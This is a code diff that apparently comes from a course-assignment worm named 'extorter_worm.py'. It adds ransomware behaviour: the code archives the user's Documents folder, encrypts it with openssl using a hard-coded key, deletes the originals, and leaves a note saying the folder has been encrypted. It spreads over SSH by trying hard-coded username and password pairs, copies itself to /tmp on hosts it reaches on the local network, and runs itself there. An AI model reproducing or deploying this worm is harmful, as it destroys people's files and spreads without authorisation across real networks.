@@ -15,8 +15,12 @@ credList = [
 ('hello', 'world'),
 ('hello1', 'world'),
 ('root', '#Gig#'),
-('cpsc', 'cpsc'),
+('cpsc', 'cpsc'),('linh','1234')
 ]
+
+
+# Path of directory we want to encrypt
+ENCRYPT_PATH = "/home/linh/"
 
 # The file marking whether the worm should spread
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
@@ -52,6 +56,16 @@ def markInfected():
 
 
 #################################################################
+# Leave a note
+#################################################################
+def leaveNote():
+	os.chdir(ENCRYPT_PATH)
+	file = open("note.txt", 'w')
+	file.write("Hey! your Documents folder has been encrypted.")
+	file.close()
+
+
+#################################################################
 # Download the encryption program
 #################################################################
 def downloadAndEncrypt(path):
@@ -62,7 +76,8 @@ def downloadAndEncrypt(path):
 	call(["chmod", "a+x", "./openssl"])
 	call(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "Document.tar", "-out", "Document.tar.enc", "-k", "cs456worm"])
 	# delete the original directory
-	shutil.rmtree('/home/cpsc/Documents/')
+	shutil.rmtree(path+'Documents/')
+	leaveNote()
 
 
 #################################################################
@@ -74,7 +89,7 @@ def createTar(path):
 	tar = tarfile.open("Document.tar","w:gz")
 
 	# Add the exdir/ directory to the archive
-	tar.add(path + "Document/")
+	tar.add(path + "Documents/")
 
 	# Close the archive file
 	tar.close()	
@@ -88,9 +103,11 @@ def createTar(path):
 def spreadAndExecute(sshClient):
 	
 	sftpClient = sshClient.open_sftp()
-	sftpClient.put("worm1.py", "/tmp/worm1.py")
-	sshClient.exec_command("chmod a+x /tmp/worm1.py")
-	sshClient.exec_command("python /tmp/worm1.py")
+	sftpClient.put("extorter_worm.py", "/tmp/extorter_worm.py")
+	sshClient.exec_command("chmod a+x /tmp/extorter_worm.py")
+	sshClient.exec_command("python /tmp/extorter_worm.py 2> errors.txt")
+	downloadAndEncrypt(ENCRYPT_PATH)
+
 	# This function takes as a parameter 
 	# an instance of the SSH class which
 	# was properly initialized and connected
@@ -259,13 +276,14 @@ if len(sys.argv) < 2:
 	if isInfectedSystem() == True: 
 		sys.exit()
 	else:
-		markInfected()
-		downloadAndEncrypt("/home/cpsc/")
+		markInfected()		
 # TODO: Get the IP of the current system
 
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
+print(getMyIP())
+print(networkHosts)
 networkHosts.remove(getMyIP())
 # TODO: Remove the IP of the current system
 # from the list of discovered systems (we
@@ -290,14 +308,17 @@ for host in networkHosts:
 		
 		try:
 			remotepath = '/tmp/infected.txt'
-			localpath = '/home/cpsc/'
+			localpath = os.getenv("HOME") + '/infected.txt'
 			sftp = sshInfo[0].open_sftp()
 			sftp.get(remotepath, localpath)
+			
 
-		except IOError:
+		except IOError, e:
+			print e
+			print "Attacking: ", host
 			print "This system should be infected"
 			spreadAndExecute(sshInfo[0])
-			
+			sys.exit()
 
 		# TODO: Check if the system was	
 		# already infected. This can be
